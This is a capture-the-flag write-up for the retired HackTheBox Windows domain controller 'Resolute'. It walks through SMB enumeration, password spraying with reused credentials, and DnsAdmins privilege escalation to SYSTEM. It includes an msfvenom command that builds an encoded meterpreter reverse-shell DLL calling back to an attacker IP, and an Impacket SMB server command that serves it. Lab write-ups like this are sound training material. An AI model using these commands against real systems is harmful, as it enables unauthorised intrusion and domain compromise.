# Hackthebox - Resolute - 10.10.10.169

## Summary
Today, [Hackthebox](https://www.hackthebox.eu) retired Resolute,  a medium-rated Windows machine acting as the Domain Controller and DNS server for Megabank.
Here's my write-up.

## Enumeration

Starting enumeration off with an initial nmap scan.
```
nmap -sV -sT -sC -p- -o nmapinitial -T4 10.10.10.169
```
While nmap returned a lot of opened ports , it doesn't look like there's anything I can use for now.

I decide to also run enum4linux
```
enum4linux -o -U -G -S 10.10.10.169 > enum4linuxout.txt
```

Enum4linux does find something useful. It looks like the administrator added one of the user's initial password in the user's description.

## Initial foothold and user flag

Trying to connect to the target using Evil-WinRM and marko's credentials fails, meaning that the user might have had their password changed in the meantime.

Since the admin might have been lazy and used the same password with other accounts, it is worth trying to connect to the target using the other user names combined with the _Welcome123!_ password.

I've created a list of all the user names found by enum4linux in order to use it with Metasploit's SMB Login Check Scanner

![users](/assets/images/HTB/Resolute/users.jpg)

I fire up msfconsole, configure necessary options and run it. It looks like the melanie user account works with the password found via enum4linux.

![smblogincheck](/assets/images/HTB/Resolute/smblogincheck.jpg)

I'm able to successfully connect using melanie's credentials and obtain the user flag.

## Privilege escalation

After some more enumeration of the directories and files on the system, I find the C:\SPTranscripts directory.

![dirforce](/assets/images/HTB/Resolute/dirforce.jpg)

The PSTranscripts directory contains the PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt file in which I found ryan's password.

![ryanspass](/assets/images/HTB/Resolute/ryanspass.jpg)

Connecting with ryan's credentials works and, even though the ryan user is not a member of the Administrators group, it is a member of the [DnsAdmins](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) group

## Privilege escalation to system and getting the root flag

I create the payload that will spawn a reverse shell using msfvenom with the following parameters: 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4455 --platform windows -a x64 -e x64/xor -i 12 -f dll -o dns.dll
```

![msfvenom](/assets/images/HTB/Resolute/msfvenom.jpg)

I then set up an SMB share using Impacket's smbserver.py.
```
python /root/Scripts/Impacket/impacket-0.9.20/examples/smbserver.py DNSPLD ./
```

I configure metasploit and start a the listener to catch the connection from the target once the payload is executed.

![msfclistener](/assets/images/HTB/Resolute/msfclistener.jpg)

And I proceed to load the payload into the target's DNS configuration and then restart the DNS service.

![loadpayload](/assets/images/HTB/Resolute/loadpayload.jpg)

In a few seconds I get a meterpreter shell as the system user.

![meterpretersession](/assets/images/HTB/Resolute/meterpretersession.jpg)

Then get the root flag.

And that's pretty much it.
